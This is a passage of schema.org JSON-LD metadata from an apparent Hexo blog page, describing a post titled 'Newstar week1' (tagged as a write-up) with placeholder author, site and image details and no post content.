Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Newstar week1","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/08/30/Newstar-week1/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/08/30/Newstar-week1/","wordCount":0,"datePublished":"2024-08-30T01:29:50.981Z","dateModified":"2024-09-03T02:43:29.715Z","articleSection":"write up","keywords":"write up,复现","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
